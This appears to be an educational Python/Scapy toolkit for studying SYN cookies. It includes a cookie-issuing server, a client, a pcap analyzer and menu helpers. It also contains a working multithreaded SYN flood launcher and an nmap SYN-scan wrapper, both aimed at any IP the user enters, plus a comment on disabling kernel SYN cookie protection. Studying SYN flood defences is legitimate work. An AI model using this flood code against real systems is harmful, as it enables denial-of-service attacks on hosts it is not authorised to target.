# NOTE:
# If you're running this on a Linux system and want to avoid interference from the kernel's own SYN cookie mechanism,
# you can temporarily disable it using the following command:
#     sudo sysctl -w net.ipv4.tcp_syncookies=0
# To re-enable it after testing:
#     sudo sysctl -w net.ipv4.tcp_syncookies=1
# To check current status:
#     sysctl net.ipv4.tcp_syncookies

import os
import time
import json
import random
import struct
import hmac
import hashlib
import threading
from datetime import datetime, timezone
from subprocess import run, PIPE
from scapy.all import *

# === CONSTANTS ===
SERVER_PORT = 12345
INTERFACE = "eth0"
SECRET_KEY = b'super_secret_key'
NONCE_SIZE = 8
TCP_NONCE_KIND = 254  # experimental TCP option

# ============================================================
# === ANALYZER FUNCTION ===
# ============================================================
def analyze_syn_cookies(pcap_file, server_ip, server_port=12345):
    if not os.path.exists(pcap_file):
        print(f"[!] File not found: {pcap_file}")
        return

    packets = rdpcap(pcap_file)

    print(f"[*] Loaded {len(packets)} packets from '{pcap_file}'\n")
    print("Detected SYN-ACK packets (SYN cookies):")
    print("-" * 110)

    found = False

    for pkt in packets:
        if IP in pkt and TCP in pkt:
            ip = pkt[IP]
            tcp = pkt[TCP]

            # Extract nonce from TCP options (if present)
            nonce = None
            for opt in tcp.options:
                if opt[0] == TCP_NONCE_KIND:
                    nonce = opt[1]

            # SYN-ACK (server → client)
            if tcp.flags == 0x12 and ip.src == server_ip and tcp.sport == server_port:
                print(
                    f"[+] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport} | "
                    f"SEQ(cookie): {tcp.seq} | "
                    f"ACK: {tcp.ack} | "
                    f"WIN: {tcp.window} | "
                    f"NONCE: {nonce.hex() if nonce else 'N/A'}"
                )
                found = True

            # ACK (client → server)
            elif tcp.flags == 0x10 and ip.dst == server_ip and tcp.dport == server_port:
                print(
                    f"[✓] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport} | "
                    f"ACK(response): {tcp.ack} | "
                    f"WIN: {tcp.window}"
                )
                found = True

    if not found:
        print("[!] No SYN-ACK packets from the specified server were found.")
# ============================================================
# === CLIENT FUNCTION  ===
# ============================================================

def run_client():
    SERVER_IP = input("Enter the server IP (e.g., 10.211.55.6): ").strip()
    SERVER_PORT = int(input("Enter the server port (e.g., 12345): ").strip())

    while True:
        CLIENT_PORT = random.randint(1024, 65535)
        start_time = time.perf_counter()

        ip = IP(dst=SERVER_IP)
        syn = TCP(sport=CLIENT_PORT, dport=SERVER_PORT, flags="S", seq=1000)
        send(ip / syn, verbose=0)
        print(f"[+] SYN sent from port {CLIENT_PORT}")

        def handle_syn_ack(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == SERVER_IP and pkt[TCP].flags == "SA":
                cookie = pkt[TCP].seq
                print(f"[✓] SYN-ACK received with cookie (seq): {cookie}")

                ack_pkt = IP(dst=SERVER_IP) / TCP(
                    sport=CLIENT_PORT,
                    dport=SERVER_PORT,
                    flags="A",
                    seq=1001,
                    ack=cookie + 1
                )
                send(ack_pkt, verbose=0)

                end = time.perf_counter()
                print(f"[✓] ACK sent. Round-trip time: {end - start_time:.4f} sec")

        sniff(
            filter=f"tcp and src host {SERVER_IP} and tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack != 0",
            prn=handle_syn_ack,
            timeout=3,
            store=False
        )

        if input("Try again? (y/n): ").lower() != 'y':
            break
# ============================================================
# === SERVER FUNCTION ===
# ============================================================

def start_server():
    nonce_table = {}

    json_file = f"syn_cookie_log_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
    with open(json_file, "w") as f:
        json.dump([], f, indent=4)

    def generate_nonce():
        secure = os.urandom(NONCE_SIZE)
        extra = random.getrandbits(64).to_bytes(8, "big")
        return secure + extra

    def generate_syn_cookie(client_ip, client_port, nonce):
        timestamp = int(time.time()) // 60
        msg = f"{client_ip}:{client_port}:{timestamp}".encode() + nonce
        digest = hmac.new(SECRET_KEY, msg, hashlib.sha256).digest()
        return struct.unpack(">I", digest[:4])[0]

    def validate_syn_cookie(client_ip, client_port, received_seq, nonce):
        timestamp = int(time.time()) // 60
        msg = f"{client_ip}:{client_port}:{timestamp}".encode() + nonce
        expected = hmac.new(SECRET_KEY, msg, hashlib.sha256).digest()
        expected_seq = struct.unpack(">I", expected[:4])[0]
        return expected_seq == received_seq

    def log_json(client_ip, client_port, nonce, cookie):
        entry = {
            "timestamp": int(time.time()),
            "client_ip": client_ip,
            "client_port": client_port,
            "nonce": nonce.hex(),
            "syn_cookie": cookie
        }
        with open(json_file, "r+") as f:
            data = json.load(f)
            data.append(entry)
            f.seek(0)
            json.dump(data, f, indent=4)

    def handle_packet(pkt):
        if pkt.haslayer(TCP) and pkt[TCP].flags == "S":
            client_ip = pkt[IP].src
            client_port = pkt[TCP].sport
            server_ip = pkt[IP].dst

            nonce = generate_nonce()
            cookie = generate_syn_cookie(client_ip, client_port, nonce)
            nonce_table[(client_ip, client_port)] = nonce

            log_json(client_ip, client_port, nonce, cookie)

            print(f"[+] Cookie generated for {client_ip}:{client_port} → {cookie}")

            ip = IP(src=server_ip, dst=client_ip)
            tcp = TCP(
                sport=SERVER_PORT,
                dport=client_port,
                flags="SA",
                seq=cookie,
                ack=pkt[TCP].seq + 1,
                window=0,
                options=[("MSS", 1460), (TCP_NONCE_KIND, nonce)]
            )
            send(ip / tcp, verbose=0)

        elif pkt.haslayer(TCP) and pkt[TCP].flags == "A":
            client_ip = pkt[IP].src
            client_port = pkt[TCP].sport
            received_cookie = pkt[TCP].ack - 1
            nonce = nonce_table.get((client_ip, client_port))

            if nonce and validate_syn_cookie(client_ip, client_port, received_cookie, nonce):
                print(f"[✓] Valid ACK from {client_ip}:{client_port}")
                del nonce_table[(client_ip, client_port)]
            else:
                print(f"[✗] Invalid ACK from {client_ip}:{client_port}")

    # ===============================
    # PCAP SETUP 
    # ===============================
    capture_file = input("Enter a name for the packet capture file (e.g., server_capture.pcap): ").strip()
    if not os.path.isabs(capture_file):
        capture_file = os.path.join(os.getcwd(), capture_file)

    print(f"[*] PCAP will be saved to: {capture_file}")
    print("[*] Capturing traffic. Press ENTER to stop and save.")

    sniffer = AsyncSniffer(
        iface=INTERFACE,
        filter=f"tcp port {SERVER_PORT}",
        prn=handle_packet,
        store=True
    )
    sniffer.start()
    input()
    packets = sniffer.stop()
    wrpcap(capture_file, packets)

    print(f"[✓] Capture saved to '{capture_file}'")
    print(f"[✓] JSON log saved to '{json_file}'")

# ============================================================
# === FLOODER ===
# ============================================================

def run_flood():
    TARGET_IP = input("Enter the target IP: ").strip()
    THREADS = int(input("Enter number of threads: ") or 20)
    stop_flag = threading.Event()

    def send_syn():
        while not stop_flag.is_set():
            ip = IP(dst=TARGET_IP)
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=SERVER_PORT,
                flags="S",
                seq=random.randint(0, 2**32 - 1)
            )
            send(ip / tcp, verbose=0)

    print(f"[*] Launching SYN flood to {TARGET_IP}:{SERVER_PORT}")
    for _ in range(THREADS):
        threading.Thread(target=send_syn, daemon=True).start()

    input("[*] Press ENTER to stop the SYN flood...")
    stop_flag.set()
    
# ============================================================
# === PING ===
# ============================================================
def ping_server():
    server_ip = input("Enter IP to ping: ").strip()
    result = run(["ping", "-c", "4", server_ip], stdout=PIPE, stderr=PIPE, text=True)
    print(result.stdout if result.returncode == 0 else result.stderr)
# ============================================================
# === SHOW IP ===
# ============================================================
def show_ip():
    result = run("ifconfig", shell=True, stdout=PIPE, text=True)
    for line in result.stdout.splitlines():
        if "inet " in line and "127.0.0.1" not in line:
            print(line.strip())
# ============================================================
# === NMAP ===
# ============================================================
def run_nmap_scan():
    target = input("Enter the target IP or hostname for Nmap scan: ").strip()
    ports = input("Enter port range or list (e.g., 20-1000 or 22,80,443): ").strip()
    if not target:
        print("[!] No target provided.")
        return
    command = ["nmap", "-sS", "-p", ports if ports else "1-1024", target]
    print(f"[*] Running Nmap command: {' '.join(command)}\n")
    try:
        result = run(command, stdout=PIPE, stderr=PIPE, text=True)
        print(result.stdout if result.returncode == 0 else result.stderr)
    except FileNotFoundError:
        print("[!] Nmap is not installed or not in PATH.")

# ============================================================
# === MENU ===
# ============================================================

print(r"""
 _   _  ___        ______   ___   _  
| \ | |/ _ \__  __/ ___\ \ / / \ | | 
|  \| | | | \ \/ /\___ \ V /|  \| | 
| |\  | |_| |>  <  ___) || | | |\  | 
|_| \_|\___//_/\_\|____/ |_| |_| \_|

SYN Cookie and DoS Simulator — designed for educational purposes only
""")

def menu():
    print("\n==== SYN Cookie Simulator Menu ====")
    print("1. Start SYN Cookie Server")
    print("2. Run Legitimate Client")
    print("3. Launch SYN Flood")
    print("4. Ping a Target IP")
    print("5. Show Host IP Address")
    print("6. Analyze PCAP for SYN-ACK Cookies")
    print("7. Perform Nmap Scan")
    print("0. Exit")
    return input("Select an option: ")

def main():
    while True:
        choice = menu()
        if choice == "1":
            start_server()
        elif choice == "2":
            run_client()
        elif choice == "3":
            run_flood()
        elif choice == "4":
            ping_server()
        elif choice == "5":
            show_ip()
        elif choice == "6":
            analyze_syn_cookies(
                input("PCAP file: ").strip(),
                input("Server IP: ").strip()
            )
        elif choice == "7":
            run_nmap_scan()
        elif choice == "0":
            print("Exiting.")
            break
        else:
            print("Invalid choice. Try again.")

main()
